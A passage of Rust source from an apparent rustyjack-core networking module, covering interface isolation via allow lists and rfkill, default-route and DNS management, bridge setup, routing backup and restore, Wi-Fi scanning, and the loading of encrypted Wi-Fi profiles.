        DhcpAttemptResult::Lease(lease) => Ok(lease.gateway),
        DhcpAttemptResult::Busy => Ok(None),
        DhcpAttemptResult::Failed(_) => Ok(None),
    }
}

pub fn rfkill_index_for_interface(interface: &str) -> Option<String> {
    let phy = Path::new("/sys/class/net").join(interface).join("phy80211");
    if !phy.exists() {
        return None;
    }
    let entries = fs::read_dir(phy).ok()?;
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        if name.starts_with("rfkill") {
            return Some(name.trim_start_matches("rfkill").to_string());
        }
    }
    None
}

pub fn is_wireless_interface(interface: &str) -> bool {
    Path::new(&format!("/sys/class/net/{}/wireless", interface)).exists()
}

pub fn read_interface_mac(interface: &str) -> Option<String> {
    let path = format!("/sys/class/net/{}/address", interface);
    fs::read_to_string(&path)
        .ok()
        .map(|mac| mac.trim().to_lowercase())
}

pub fn find_interface_by_mac(mac: &str) -> Option<String> {
    let target = mac.trim().to_lowercase();
    if target.is_empty() {
        return None;
    }
    let entries = fs::read_dir("/sys/class/net").ok()?;
    for entry in entries.flatten() {
        let iface = entry.file_name().to_string_lossy().to_string();
        if iface == "lo" {
            continue;
        }
        let path = format!("/sys/class/net/{}/address", iface);
        if let Ok(val) = fs::read_to_string(&path) {
            if val.trim().to_lowercase() == target {
                return Some(iface);
            }
        }
    }
    None
}

pub fn apply_interface_isolation_strict(allowed: &[String]) -> Result<()> {
    let ops = Arc::new(crate::system::ops::RealNetOps) as Arc<dyn crate::system::ops::NetOps>;
    let outcome = apply_interface_isolation_with_ops_strict(ops, allowed)?;
    if !outcome.errors.is_empty() {
        let error_msgs: Vec<String> = outcome
            .errors
            .iter()
            .map(|e| format!("{}: {}", e.interface, e.message))
            .collect();
        bail!("Interface isolation errors: {}", error_msgs.join("; "));
    }
    Ok(())
}

pub fn apply_interface_isolation_with_ops_strict(
    ops: Arc<dyn crate::system::ops::NetOps>,
    allowed: &[String],
) -> Result<crate::system::ops::IsolationOutcome> {
    apply_interface_isolation_with_ops_strict_impl(ops, allowed, false)
}

pub fn apply_interface_isolation_with_ops_block_all(
    ops: Arc<dyn crate::system::ops::NetOps>,
) -> Result<crate::system::ops::IsolationOutcome> {
    apply_interface_isolation_with_ops_strict_impl(ops, &[], true)
}

pub fn apply_interface_isolation_with_ops_passive(
    ops: Arc<dyn crate::system::ops::NetOps>,
    root: PathBuf,
) -> Result<crate::system::ops::IsolationOutcome> {
    let engine = crate::system::IsolationEngine::new(ops, root);
    engine.enforce_passive()
}

fn apply_interface_isolation_with_ops_strict_impl(
    ops: Arc<dyn crate::system::ops::NetOps>,
    allowed: &[String],
    allow_empty: bool,
) -> Result<crate::system::ops::IsolationOutcome> {
    use std::collections::HashSet;

    let allowed_set: HashSet<String> = allowed
        .iter()
        .map(|s| s.trim())
        .filter(|s| !s.is_empty())
        .map(|s| s.to_string())
        .collect();

    if allowed_set.is_empty() && !allow_empty {
        warn!(target: "net", "interface_isolation_empty_allow_list");
        bail!("Cannot enforce isolation: no allowed interfaces provided");
    }

    debug!(
        target: "net",
        allow_list = ?allowed_set,
        "interface_isolation_strict_allow_list"
    );

    let routes = RouteManager::new(Arc::clone(&ops));
    let interfaces = ops.list_interfaces()?;
    let mut allowed_vec = Vec::new();
    let mut blocked_vec = Vec::new();
    let mut errors = Vec::new();

    if !allow_empty
        && !interfaces
            .iter()
            .any(|iface| allowed_set.contains(&iface.name))
    {
        let allowed_list = allowed_set.iter().cloned().collect::<Vec<_>>().join(", ");
        warn!(
            target: "net",
            allowed_list = %allowed_list,
            "interface_isolation_missing_allowed"
        );
        bail!(
            "Cannot enforce isolation: none of the allowed interfaces exist ({})",
            allowed_list
        );
    }

    let mut allowed_infos = Vec::new();
    let mut blocked_infos = Vec::new();
    for iface_info in interfaces {
        if allowed_set.contains(&iface_info.name) {
            allowed_infos.push(iface_info);
        } else {
            blocked_infos.push(iface_info);
        }
    }

    // Phase 1: make sure all allowed interfaces can be prepared/admin-UP before
    // we touch any non-allowed interfaces. This prevents cutting off the current
    // uplink when switching to a target interface that cannot come up.
    //
    // IMPORTANT: Do NOT release DHCP, flush addresses, or delete default routes
    // for allowed interfaces. These destructive operations would break the active
    // uplink and cause route snapshot diffs in read-only test flows.
    for iface_info in allowed_infos {
        debug!(
            target: "net",
            iface = %iface_info.name,
            allowed = true,
            wireless = iface_info.is_wireless,
            "interface_isolation_strict_eval"
        );

        if iface_info.is_wireless {
            if let Err(e) = ops.set_rfkill_block(&iface_info.name, false) {
                errors.push(crate::system::ops::ErrorEntry {
                    interface: iface_info.name.clone(),
                    message: format!("rfkill unblock failed: {}", e),
                });
            }
            if let Ok(blocked) = ops.is_rfkill_blocked(&iface_info.name) {
                if blocked {
                    errors.push(crate::system::ops::ErrorEntry {
                        interface: iface_info.name.clone(),
                        message: "rfkill still blocked after unblock".to_string(),
                    });
                }
            }
        }

        if let Err(e) = ops.bring_up(&iface_info.name) {
            errors.push(crate::system::ops::ErrorEntry {
                interface: iface_info.name.clone(),
                message: format!("bring up failed: {}", e),
            });
        }

        if let Err(e) = wait_for_admin_state(&*ops, &iface_info.name, true, Duration::from_secs(10))
        {
            errors.push(crate::system::ops::ErrorEntry {
                interface: iface_info.name.clone(),
                message: format!("wait for up failed: {}", e),
            });
        }

        allowed_vec.push(iface_info.name);
    }

    if !errors.is_empty() {
        warn!(
            target: "net",
            errors = errors.len(),
            "interface_isolation_strict_abort_before_blocking"
        );
        return Ok(crate::system::ops::IsolationOutcome {
            allowed: allowed_vec,
            blocked: blocked_vec,
            errors,
        });
    }

    // Phase 2: only after the allowed set is up, isolate all non-allowed interfaces.
    for iface_info in blocked_infos {
        debug!(
            target: "net",
            iface = %iface_info.name,
            allowed = false,
            wireless = iface_info.is_wireless,
            "interface_isolation_strict_eval"
        );

        if let Err(e) = ops.release_dhcp(&iface_info.name) {
            warn!(target: "net", iface = %iface_info.name, error = %e, "dhcp_release_failed");
        }
        if let Err(e) = ops.flush_addresses(&iface_info.name) {
            warn!(target: "net", iface = %iface_info.name, error = %e, "flush_addresses_failed");
        }
        if let Err(e) = routes.delete_default_route(&iface_info.name) {
            debug!(target: "net", iface = %iface_info.name, error = %e, "default_route_delete_skipped");
        }

        if let Err(e) = ops.bring_down(&iface_info.name) {
            errors.push(crate::system::ops::ErrorEntry {
                interface: iface_info.name.clone(),
                message: format!("bring down failed: {}", e),
            });
        }

        if let Err(e) = wait_for_admin_state(&*ops, &iface_info.name, false, Duration::from_secs(5))
        {
            errors.push(crate::system::ops::ErrorEntry {
                interface: iface_info.name.clone(),
                message: format!("wait for down failed: {}", e),
            });
        }

        if iface_info.is_wireless {
            if let Err(e) = ops.set_rfkill_block(&iface_info.name, true) {
                errors.push(crate::system::ops::ErrorEntry {
                    interface: iface_info.name.clone(),
                    message: format!("rfkill block failed: {}", e),
                });
            }
            if let Ok(blocked) = ops.is_rfkill_blocked(&iface_info.name) {
                if !blocked {
                    errors.push(crate::system::ops::ErrorEntry {
                        interface: iface_info.name.clone(),
                        message: "rfkill not blocked after block".to_string(),
                    });
                }
            }
        }

        blocked_vec.push(iface_info.name);
    }

    if let Err(e) = verify_only_allow_list_admin_up(&*ops, &allowed_set) {
        errors.push(crate::system::ops::ErrorEntry {
            interface: "invariant".to_string(),
            message: e.to_string(),
        });
    }

    Ok(crate::system::ops::IsolationOutcome {
        allowed: allowed_vec,
        blocked: blocked_vec,
        errors,
    })
}

pub(crate) fn verify_only_allow_list_admin_up(
    ops: &dyn crate::system::ops::NetOps,
    allowed: &std::collections::HashSet<String>,
) -> Result<()> {
    let interfaces = ops.list_interfaces()?;
    let mut admin_up = Vec::new();
    for iface in &interfaces {
        if ops.admin_is_up(&iface.name)? {
            admin_up.push(iface.name.clone());
        }
    }

    for iface in &admin_up {
        if !allowed.contains(iface) {
            bail!(
                "Isolation invariant violated: {} is UP but not allowed",
                iface
            );
        }
    }

    for iface in allowed {
        if !admin_up.contains(iface) {
            bail!("Isolation invariant violated: allowed {} is not UP", iface);
        }
    }

    for iface in &interfaces {
        if allowed.contains(&iface.name) || !iface.is_wireless {
            continue;
        }
        match ops.is_rfkill_blocked(&iface.name) {
            Ok(true) => {}
            Ok(false) => bail!(
                "Isolation invariant violated: {} is wireless but not rfkill blocked",
                iface.name
            ),
            Err(e) => {
                bail!(
                    "Isolation invariant violated: rfkill check failed for {}: {}",
                    iface.name,
                    e
                );
            }
        }
    }

    Ok(())
}

fn wait_for_admin_state(
    ops: &dyn crate::system::ops::NetOps,
    iface: &str,
    desired_up: bool,
    timeout: Duration,
) -> Result<()> {
    if ops.admin_is_up(iface)? == desired_up {
        return Ok(());
    }

    let start = Instant::now();
    loop {
        if ops.admin_is_up(iface)? == desired_up {
            return Ok(());
        }

        if start.elapsed() >= timeout {
            bail!(
                "Timed out waiting for {} to become {}",
                iface,
                if desired_up { "UP" } else { "DOWN" }
            );
        }

        std::thread::sleep(Duration::from_millis(50));
    }
}

pub fn apply_interface_isolation(allowed: &[String]) -> Result<()> {
    let outcome = apply_interface_isolation_with_ops(&crate::system::ops::RealNetOps, allowed)?;
    if !outcome.errors.is_empty() {
        let error_msgs: Vec<String> = outcome
            .errors
            .iter()
            .map(|e| format!("{}: {}", e.interface, e.message))
            .collect();
        bail!("Interface isolation errors: {}", error_msgs.join("; "));
    }
    Ok(())
}

pub fn apply_interface_isolation_with_ops(
    ops: &dyn crate::system::ops::NetOps,
    allowed: &[String],
) -> Result<crate::system::ops::IsolationOutcome> {
    use std::collections::HashSet;

    let allowed_set: HashSet<String> = allowed
        .iter()
        .map(|s| s.trim())
        .filter(|s| !s.is_empty())
        .map(|s| s.to_string())
        .collect();

    if allowed_set.is_empty() {
        warn!(target: "net", "interface_isolation_empty_allow_list");
        bail!("Cannot enforce isolation: no allowed interfaces provided");
    }
    debug!(
        target: "net",
        allow_list = ?allowed_set,
        "interface_isolation_allow_list"
    );

    let interfaces = ops.list_interfaces()?;
    let mut allowed_vec = Vec::new();
    let mut blocked_vec = Vec::new();
    let mut errors = Vec::new();

    if !interfaces
        .iter()
        .any(|iface| allowed_set.contains(&iface.name))
    {
        let allowed_list = allowed_set.iter().cloned().collect::<Vec<_>>().join(", ");
        warn!(
            target: "net",
            allowed_list = %allowed_list,
            "interface_isolation_missing_allowed"
        );
        bail!(
            "Cannot enforce isolation: none of the allowed interfaces exist ({})",
            allowed_list
        );
    }

    for iface_info in interfaces {
        let is_allowed = allowed_set.contains(&iface_info.name);
        debug!(
            target: "net",
            iface = %iface_info.name,
            allowed = is_allowed,
            wireless = iface_info.is_wireless,
            "interface_isolation_eval"
        );

        if is_allowed {
            if iface_info.is_wireless {
                if let Err(e) = ops.set_rfkill_block(&iface_info.name, false) {
                    errors.push(crate::system::ops::ErrorEntry {
                        interface: iface_info.name.clone(),
                        message: format!("rfkill unblock failed: {}", e),
                    });
                }
            }

            if let Err(e) = ops.bring_up(&iface_info.name) {
                if !iface_info.is_wireless {
                    errors.push(crate::system::ops::ErrorEntry {
                        interface: iface_info.name.clone(),
                        message: format!("bring up failed: {}", e),
                    });
                }
            }

            allowed_vec.push(iface_info.name);
        } else {
            let _ = ops.bring_down(&iface_info.name);
            if iface_info.is_wireless {
                let _ = ops.set_rfkill_block(&iface_info.name, true);
            }
            blocked_vec.push(iface_info.name);
        }
    }

    Ok(crate::system::ops::IsolationOutcome {
        allowed: allowed_vec,
        blocked: blocked_vec,
        errors,
    })
}

pub fn enforce_single_interface(interface: &str) -> Result<()> {
    if interface.is_empty() {
        bail!("Cannot enforce isolation: no interface specified");
    }
    info!(target: "net", iface = %interface, "enforce_single_interface");
    apply_interface_isolation_strict(&[interface.to_string()])
}

pub fn set_default_route(interface: &str, gateway: Ipv4Addr) -> Result<()> {
    set_default_route_with_metric(interface, gateway, None)
}

pub fn set_default_route_with_metric(
    interface: &str,
    gateway: Ipv4Addr,
    metric: Option<u32>,
) -> Result<()> {
    use std::net::IpAddr;

    #[cfg(target_os = "linux")]
    {
        let iface = interface.to_string();
        let gw = IpAddr::V4(gateway);

        tokio::runtime::Handle::try_current()
            .map(|handle| {
                handle.block_on(async {
                    rustyjack_netlink::replace_default_route(gw, &iface, metric)
                        .await
                        .map_err(|e| anyhow::anyhow!("Failed to set default route: {}", e))
                })
            })
            .unwrap_or_else(|_| {
                crate::runtime::shared_runtime()?.block_on(async {
                    rustyjack_netlink::replace_default_route(gw, &iface, metric)
                        .await
                        .map_err(|e| anyhow::anyhow!("Failed to set default route: {}", e))
                })
            })
    }

    #[cfg(not(target_os = "linux"))]
    bail!("Route management only supported on Linux")
}

pub fn rewrite_dns_servers(interface: &str, dns_servers: &[Ipv4Addr]) -> Result<()> {
    let servers = if dns_servers.is_empty() {
        tracing::warn!(
            target: "net",
            iface = %interface,
            "dns_missing_fallback"
        );
        fallback_dns()
    } else {
        dns_servers.to_vec()
    };

    let mut content = format!("# Managed by rustyjack-core for {interface}\n");
    for server in servers {
        content.push_str(&format!("nameserver {}\n", server));
    }

    let root = resolve_root(None)?;
    let resolv_path = root.join("resolv.conf");
    if let Some(parent) = resolv_path.parent() {
        fs::create_dir_all(parent).with_context(|| format!("creating {}", parent.display()))?;
    }
    let tmp_path = resolv_path.with_file_name(".resolv.conf.rustyjack.tmp");
    let mut file = fs::File::create(&tmp_path).context("creating resolv.conf temp file")?;
    file.write_all(content.as_bytes())
        .context("writing resolv.conf temp file")?;
    file.sync_all().ok();
    fs::rename(&tmp_path, &resolv_path).context("renaming resolv.conf")?;
    if let Ok(dir) = fs::File::open(&root) {
        let _ = dir.sync_all();
    }
    Ok(())
}

pub fn select_best_interface(root: &Path, prefer_wifi: bool) -> Result<Option<String>> {
    let summaries = list_interface_summaries()?;
    if summaries.is_empty() {
        return Ok(None);
    }

    if let Some(pref) = read_interface_preference(root, "system_preferred")? {
        if summaries.iter().any(|s| s.name == pref && s.ip.is_some()) {
            info!(target: "net", iface = %pref, "preferred_interface_selected");
            return Ok(Some(pref));
        }
    }

    if let Ok(default_route) = discover_default_interface() {
        if summaries
            .iter()
            .any(|s| s.name == default_route && s.ip.is_some())
        {
            info!(
                target: "net",
                iface = %default_route,
                "default_route_interface_selected"
            );
            return Ok(Some(default_route));
        }
    }

    if prefer_wifi {
        if let Some(wireless) = summaries
            .iter()
            .find(|s| s.kind == "wireless" && s.ip.is_some())
        {
            info!(
                target: "net",
                iface = %wireless.name,
                "wireless_interface_selected"
            );
            return Ok(Some(wireless.name.clone()));
        }
    }

    let priority = ["eth0", "wlan1", "wlan0"];
    for candidate in priority {
        if summaries
            .iter()
            .any(|s| s.name == candidate && s.ip.is_some())
        {
            info!(target: "net", iface = %candidate, "priority_interface_selected");
            return Ok(Some(candidate.to_string()));
        }
    }

    summaries
        .iter()
        .find(|s| s.ip.is_some())
        .map(|s| s.name.clone())
        .or_else(|| summaries.first().map(|s| s.name.clone()))
        .ok_or_else(|| anyhow!("No interfaces available"))
        .map(|name| {
            info!(target: "net", iface = %name, "fallback_interface_selected");
            name
        })
        .map(Some)
}

pub fn read_interface_preference(root: &Path, key: &str) -> Result<Option<String>> {
    let path = root.join("wifi").join("interface_preferences.json");
    if !path.exists() {
        return Ok(None);
    }
    let contents = fs::read_to_string(&path)?;
    let map: Map<String, Value> = serde_json::from_str(&contents)?;
    Ok(map
        .get(key)
        .and_then(|v| v.get("interface"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string()))
}

pub fn read_interface_preference_with_mac(
    root: &Path,
    key: &str,
) -> Result<Option<(String, Option<String>)>> {
    let path = root.join("wifi").join("interface_preferences.json");
    if !path.exists() {
        return Ok(None);
    }
    let contents = fs::read_to_string(&path)?;
    let map: Map<String, Value> = serde_json::from_str(&contents)?;
    if let Some(entry) = map.get(key) {
        if let Some(iface) = entry.get("interface").and_then(|v| v.as_str()) {
            let mac = entry
                .get("mac")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string());
            return Ok(Some((iface.to_string(), mac)));
        }
    }
    Ok(None)
}

pub fn write_interface_preference(root: &Path, key: &str, interface: &str) -> Result<()> {
    let path = root.join("wifi").join("interface_preferences.json");
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    let mac = read_interface_mac(interface);
    let mut map: Map<String, Value> = if path.exists() {
        let contents = fs::read_to_string(&path)?;
        serde_json::from_str(&contents).unwrap_or_default()
    } else {
        Map::new()
    };
    map.insert(
        key.to_string(),
        json!({
            "interface": interface,
            "mac": mac,
            "timestamp": Local::now().to_rfc3339(),
        }),
    );
    let json_value = Value::Object(map);
    fs::write(&path, serde_json::to_string_pretty(&json_value)?)?;
    Ok(())
}

#[cfg(feature = "external_tools")]
pub fn backup_repository(root: &Path, backup_dir: Option<&Path>) -> Result<PathBuf> {
    crate::external_tools::archive_ops::backup_repository(root, backup_dir)
}

#[cfg(not(feature = "external_tools"))]
pub fn backup_repository(_root: &Path, _backup_dir: Option<&Path>) -> Result<PathBuf> {
    bail!("backup_repository disabled (external_tools)")
}

#[cfg(feature = "external_tools")]
pub fn git_reset_to_remote(root: &Path, remote: &str, branch: &str) -> Result<()> {
    crate::external_tools::git_ops::git_reset_to_remote(root, remote, branch)
}

#[cfg(not(feature = "external_tools"))]
pub fn git_reset_to_remote(_root: &Path, _remote: &str, _branch: &str) -> Result<()> {
    bail!("git_reset_to_remote disabled (external_tools)")
}

pub fn restart_system_service(service: &str) -> Result<()> {
    tokio::runtime::Handle::try_current()
        .map(|handle| {
            handle.block_on(async {
                rustyjack_netlink::systemd_restart_unit(service)
                    .await
                    .map_err(|e| anyhow!("Failed to restart {service}: {e}"))
            })
        })
        .unwrap_or_else(|_| {
            crate::runtime::shared_runtime()?.block_on(async {
                rustyjack_netlink::systemd_restart_unit(service)
                    .await
                    .map_err(|e| anyhow!("Failed to restart {service}: {e}"))
            })
        })
}

pub fn start_bridge_pair(interface_a: &str, interface_b: &str) -> Result<()> {
    let _ = netlink_set_interface_down("br0");
    let _ = netlink_bridge_delete("br0");
    for iface in [interface_a, interface_b] {
        netlink_set_interface_down(iface).with_context(|| format!("bringing {iface} down"))?;
    }
    netlink_bridge_create("br0").context("creating br0 bridge")?;
    for iface in [interface_a, interface_b] {
        netlink_bridge_add_interface("br0", iface)
            .with_context(|| format!("adding {iface} to br0"))?;
    }
    for iface in [interface_a, interface_b, "br0"] {
        netlink_set_interface_up(iface).with_context(|| format!("bringing {iface} up"))?;
    }
    Ok(())
}

pub fn stop_bridge_pair(interface_a: &str, interface_b: &str) -> Result<()> {
    let _ = netlink_set_interface_down("br0");
    let _ = netlink_bridge_delete("br0");
    for iface in [interface_a, interface_b] {
        let _ = netlink_set_interface_down(iface);
    }
    Ok(())
}

pub fn backup_routing_state(root: &Path) -> Result<PathBuf> {
    let path = root.join("wifi").join("routing_backup.json");
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    let default_route = read_default_route().unwrap_or(None);
    let routes = netlink_list_routes().unwrap_or_default();
    let interfaces = netlink_list_interfaces().unwrap_or_default();
    let mut iface_map = std::collections::HashMap::new();
    for iface in &interfaces {
        iface_map.insert(iface.index, iface.name.clone());
    }

    let route_list: Vec<Value> = routes
        .into_iter()
        .map(|route| {
            let iface_name = route
                .interface_index
                .and_then(|idx| iface_map.get(&idx).cloned());
            json!({
                "destination": route.destination.map(|d| d.to_string()),
                "prefix_len": route.prefix_len,
                "gateway": route.gateway.map(|g| g.to_string()),
                "interface": iface_name,
                "metric": route.metric,
            })
        })
        .collect();

    let mut interface_map = Map::new();
    for iface in interfaces {
        let addrs: Vec<String> = iface
            .addresses
            .into_iter()
            .map(|addr| format!("{}/{}", addr.address, addr.prefix_len))
            .collect();
        interface_map.insert(iface.name, json!(addrs));
    }
    let json_value = json!({
        "timestamp": Local::now().to_rfc3339(),
        "default_route": default_route,
        "routes": route_list,
        "interfaces": interface_map,
    });
    fs::write(&path, serde_json::to_string_pretty(&json_value)?)?;
    Ok(path)
}

pub fn restore_routing_state(root: &Path) -> Result<()> {
    let path = root.join("wifi").join("routing_backup.json");
    if !path.exists() {
        bail!("routing backup missing at {}", path.display());
    }
    let contents = fs::read_to_string(&path)?;
    let value: Value = serde_json::from_str(&contents)?;
    let route: Option<DefaultRouteInfo> = value
        .get("default_route")
        .cloned()
        .and_then(|v| serde_json::from_value(v).ok());
    let route = route.ok_or_else(|| anyhow!("backup file missing default route"))?;
    let interface = route
        .interface
        .ok_or_else(|| anyhow!("backup missing interface"))?;
    let gateway = route
        .gateway
        .ok_or_else(|| anyhow!("backup missing gateway"))?;
    let _ = netlink_delete_default_route();
    netlink_add_default_route(gateway.into(), &interface, route.metric)
        .with_context(|| format!("restoring default route via {interface}"))?;
    Ok(())
}

pub fn set_interface_metric(interface: &str, metric: u32) -> Result<()> {
    let gateway =
        interface_gateway(interface)?.ok_or_else(|| anyhow!("No gateway found for {interface}"))?;
    let _ = netlink_delete_default_route();
    netlink_add_default_route(gateway.into(), interface, Some(metric))
        .with_context(|| format!("setting metric for {interface}"))
}

pub fn select_wifi_interface(preferred: Option<String>) -> Result<String> {
    if let Some(name) = preferred {
        let summaries = list_interface_summaries()?;
        let summary = summaries
            .iter()
            .find(|s| s.name == name)
            .ok_or_else(|| anyhow!("interface {} not found", name))?;
        if summary.kind != "wireless" {
            bail!("interface {} is not wireless", name);
        }
        info!(
            target: "wifi",
            iface = %name,
            "wifi_interface_override_selected"
        );
        return Ok(name);
    }
    let summaries = list_interface_summaries()?;
    if let Some(active) = summaries
        .iter()
        .find(|s| s.kind == "wireless" && s.ip.is_some())
    {
        info!(
            target: "wifi",
            iface = %active.name,
            "wifi_interface_active_selected"
        );
        return Ok(active.name.clone());
    }
    if let Some(any_wireless) = summaries.iter().find(|s| s.kind == "wireless") {
        info!(
            target: "wifi",
            iface = %any_wireless.name,
            "wifi_interface_available_selected"
        );
        return Ok(any_wireless.name.clone());
    }
    Err(anyhow!("No wireless interfaces found"))
}

pub fn scan_wifi_networks(interface: &str) -> Result<Vec<WifiNetwork>> {
    scan_wifi_networks_with_timeout_cancel(interface, Duration::from_secs(5), None)
}

pub fn scan_wifi_networks_with_timeout(
    interface: &str,
    timeout: Duration,
) -> Result<Vec<WifiNetwork>> {
    scan_wifi_networks_with_timeout_cancel(interface, timeout, None)
}

pub fn scan_wifi_networks_with_timeout_cancel(
    interface: &str,
    timeout: Duration,
    cancel: Option<&CancelFlag>,
) -> Result<Vec<WifiNetwork>> {
    check_network_permissions()?;

    if interface.trim().is_empty() {
        bail!("interface cannot be empty");
    }

    log_wifi_preflight(interface);

    if let Ok(Some(idx)) = rfkill_find_index(interface) {
        if let Err(e) = rfkill_unblock(idx) {
            tracing::warn!(
                target: "wifi",
                iface = %interface,
                error = %e,
                "rfkill_unblock_failed"
            );
        }
    }

    let _ = netlink_set_interface_up(interface);
    cancel_sleep(cancel, std::time::Duration::from_millis(750))?;

    check_cancel(cancel)?;
    let results = rustyjack_netlink::scan_wifi_networks(interface, timeout)
        .with_context(|| format!("nl80211 scan failed for {interface}"))?;

    let mut networks = Vec::new();
    for entry in results {
        let ssid = entry
            .ssid
            .as_ref()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty());
        if ssid.is_none() {
            continue;
        }
        let bssid = Some(format!(
            "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
            entry.bssid[0],
            entry.bssid[1],
            entry.bssid[2],
            entry.bssid[3],
            entry.bssid[4],
            entry.bssid[5]
        ));
        let signal_dbm = entry.signal_mbm.map(|mbm| (mbm / 100) as i32);
        let channel = entry
            .frequency
            .and_then(rustyjack_netlink::WirelessManager::frequency_to_channel);
        let encrypted = entry
            .capability
            .map(|cap| (cap & 0x0010) != 0)
            .unwrap_or(false);

        networks.push(WifiNetwork {
            ssid,
            bssid,
            quality: signal_dbm.map(|dbm| format!("{}%", signal_to_quality(dbm))),
            signal_dbm,
            channel,
            encrypted,
        });
    }

    if networks.is_empty() {
        bail!("WiFi scan returned no results for {interface}");
    }

    Ok(networks)
}

#[allow(dead_code)]
fn runtime_sleep(duration: Duration) {
    if let Ok(handle) = tokio::runtime::Handle::try_current() {
        handle.block_on(tokio::time::sleep(duration));
        return;
    }
    if let Ok(rt) = crate::runtime::shared_runtime() {
        rt.block_on(tokio::time::sleep(duration));
        return;
    }
    std::thread::sleep(duration);
}

fn signal_to_quality(dbm: i32) -> i32 {
    // Map RSSI in dBm to a 0-100 quality scale for display.
    let mut quality = (dbm + 100) * 2;
    if quality < 0 {
        quality = 0;
    } else if quality > 100 {
        quality = 100;
    }
    quality
}

fn log_wifi_preflight(interface: &str) {
    let base = Path::new("/sys/class/net").join(interface);
    if !base.exists() {
        tracing::warn!(
            target: "wifi",
            iface = %interface,
            "wifi_preflight_missing_sysfs"
        );
        return;
    }

    let read_trim = |path: &Path| -> String {
        fs::read_to_string(path)
            .unwrap_or_else(|_| "unknown".to_string())
            .trim()
            .to_string()
    };
    let oper = read_trim(&base.join("operstate"));
    let carrier = read_trim(&base.join("carrier"));
    let mac = read_trim(&base.join("address"));
    let ipv4 = netlink_get_ipv4_addresses(interface)
        .unwrap_or_default()
        .iter()
        .filter_map(|addr| match addr.address {
            std::net::IpAddr::V4(v4) => Some(v4.to_string()),
            _ => None,
        })
        .collect::<Vec<_>>();
    tracing::info!(
        target: "wifi",
        iface = %interface,
        operstate = %oper,
        carrier = %carrier,
        mac = %mac,
        ipv4 = ?ipv4,
        "wifi_preflight_state"
    );

    if let Ok(Some(idx)) = rfkill_find_index(interface) {
        let rf_base = Path::new("/sys/class/rfkill").join(format!("rfkill{idx}"));
        let soft = read_trim(&rf_base.join("soft"));
        let hard = read_trim(&rf_base.join("hard"));
        let name = read_trim(&rf_base.join("name"));
        tracing::info!(
            target: "wifi",
            iface = %interface,
            idx = idx,
            name = %name,
            soft = %soft,
            hard = %hard,
            "wifi_preflight_rfkill"
        );
    } else {
        tracing::info!(
            target: "wifi",
            iface = %interface,
            "wifi_preflight_rfkill_missing"
        );
    }
}

#[allow(dead_code)]
fn freq_to_channel(freq: u32) -> Option<u8> {
    match freq {
        2412 => Some(1),
        2417 => Some(2),
        2422 => Some(3),
        2427 => Some(4),
        2432 => Some(5),
        2437 => Some(6),
        2442 => Some(7),
        2447 => Some(8),
        2452 => Some(9),
        2457 => Some(10),
        2462 => Some(11),
        2467 => Some(12),
        2472 => Some(13),
        2484 => Some(14),
        5180 => Some(36),
        5200 => Some(40),
        5220 => Some(44),
        5240 => Some(48),
        5260 => Some(52),
        5280 => Some(56),
        5300 => Some(60),
        5320 => Some(64),
        5500 => Some(100),
        5520 => Some(104),
        5540 => Some(108),
        5560 => Some(112),
        5580 => Some(116),
        5600 => Some(120),
        5620 => Some(124),
        5640 => Some(128),
        5660 => Some(132),
        5680 => Some(136),
        5700 => Some(140),
        5720 => Some(144),
        5745 => Some(149),
        5765 => Some(153),
        5785 => Some(157),
        5805 => Some(161),
        5825 => Some(165),
        _ => None,
    }
}

pub fn list_wifi_profiles(root: &Path) -> Result<Vec<WifiProfileRecord>> {
    let mut profiles = Vec::new();
    let dir = wifi_profiles_dir(root);
    if !dir.exists() {
        tracing::info!(
            target: "wifi",
            path = %dir.display(),
            "wifi_profiles_missing"
        );
        return Ok(profiles);
    }

    tracing::info!(
        target: "wifi",
        path = %dir.display(),
        "wifi_profiles_load_start"
    );

    let entries = fs::read_dir(&dir)
        .with_context(|| format!("reading profiles directory {}", dir.display()))?;

    for entry in entries {
        let entry = match entry {
            Ok(e) => e,
            Err(e) => {
                tracing::warn!(
                    target: "wifi",
                    error = %e,
                    "wifi_profiles_entry_read_failed"
                );
                continue;
            }
        };

        let path = entry.path();
        if !path.is_file() {
            continue;
        }

        let ext = path.extension().and_then(|s| s.to_str());
        if ext != Some("json") && ext != Some("enc") {
            continue;
        }

        let contents = if ext == Some("enc") {
            match rustyjack_encryption::decrypt_file(&path) {
                Ok(mut bytes) => {
                    let out = match String::from_utf8(bytes.clone()) {
                        Ok(mut s) => {
                            let copy = s.clone();
                            s.zeroize();
                            copy
                        }
                        Err(e) => {
                            tracing::warn!(
                                target: "wifi",
                                path = %path.display(),
                                error = %e,
                                "wifi_profile_utf8_invalid"
                            );
                            bytes.zeroize();
                            continue;
                        }
                    };
                    bytes.zeroize();
                    out
                }
                Err(e) => {
                    tracing::warn!(
                        target: "wifi",
                        path = %path.display(),
                        error = %e,
                        "wifi_profile_decrypt_failed"
                    );
                    continue;
                }
            }
        } else {
            match fs::read_to_string(&path) {
                Ok(mut c) => {
                    let out = c.clone();
                    c.zeroize();
                    out
                }
                Err(e) => {
                    tracing::warn!(
                        target: "wifi",
                        path = %path.display(),
                        error = %e,
                        "wifi_profile_read_failed"
                    );
                    continue;
                }
            }
        };

        match serde_json::from_str::<WifiProfile>(&contents) {
            Ok(profile) => {
                let filename = path
                    .file_name()
                    .and_then(|s| s.to_str())
                    .unwrap_or_default()
                    .to_string();

                tracing::debug!(
                    target: "wifi",
                    ssid = %profile.ssid,
                    filename = %filename,
                    "wifi_profile_loaded"
                );

                profiles.push(WifiProfileRecord {
                    ssid: profile.ssid,
                    interface: profile.interface,
                    priority: profile.priority,
                    auto_connect: profile.auto_connect,
                    filename,
                    last_used: profile.last_used,
                    created: profile.created,
                });
            }
            Err(err) => {
                tracing::warn!(
                    target: "wifi",
                    path = %path.display(),
                    error = %err,
                    "wifi_profile_parse_failed"
                );
            }
        }
    }

    profiles.sort_by(|a, b| {
        b.priority
            .cmp(&a.priority)
            .then_with(|| a.ssid.to_lowercase().cmp(&b.ssid.to_lowercase()))
    });

    tracing::info!(
        target: "wifi",
        count = profiles.len(),
        "wifi_profiles_loaded"
    );
    Ok(profiles)
}

